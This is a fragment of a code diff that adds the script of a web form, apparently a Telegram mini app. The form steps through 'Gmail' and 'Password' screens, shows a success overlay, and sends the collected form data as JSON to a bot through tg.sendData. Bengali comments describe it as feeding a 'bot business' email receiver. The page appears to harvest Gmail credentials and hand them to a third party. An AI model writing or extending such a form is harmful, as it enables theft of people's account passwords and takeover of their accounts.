+            resetSpinner('password');
+            currentStepName = "Password";
+        } else if (currentStepName === "Password") {
+            document.getElementById('stepPassword').style.display = 'none';
+            document.getElementById('stepGmail').style.display = 'block';
+            document.getElementById('backArrowBtn').style.display = 'none';
+            resetSpinner('gmail');
+            currentStepName = "Gmail";
+        }
+    }
+
+    function resetSpinner(prefix) {
+        document.getElementById(prefix + 'Spinner').style.display = 'none';
+        document.getElementById(prefix + 'BtnText').style.display = 'block';
+        document.getElementById(prefix + 'ProceedBtn').removeAttribute('disabled');
+        document.getElementById(prefix + 'ProceedBtn').classList.add('active');
+    }
+
+    // চূড়ান্ত ডাটা সাবমিট (বট বিজনেসের email_receiver বা অনুরুপ হ্যান্ডলারের জন্য)
+    function submitFinalData() {
+        document.getElementById('submitSpinner').style.display = 'block';
+        document.getElementById('submitBtnText').style.display = 'none';
+        document.getElementById('submitBtn').setAttribute('disabled','true');
+
+        // আপনার প্রফেশনাল সাকসেস ওভারলে কার্ড শো
+        document.getElementById('successOverlay').style.display = 'flex';
+
+        setTimeout(() => {
+            // বটের কাছে JSON ডাটা পাসিং
+            tg.sendData(JSON.stringify(collectedFormData));
+        }, 2000);
+    }
+</script>
 </body>
 </html>
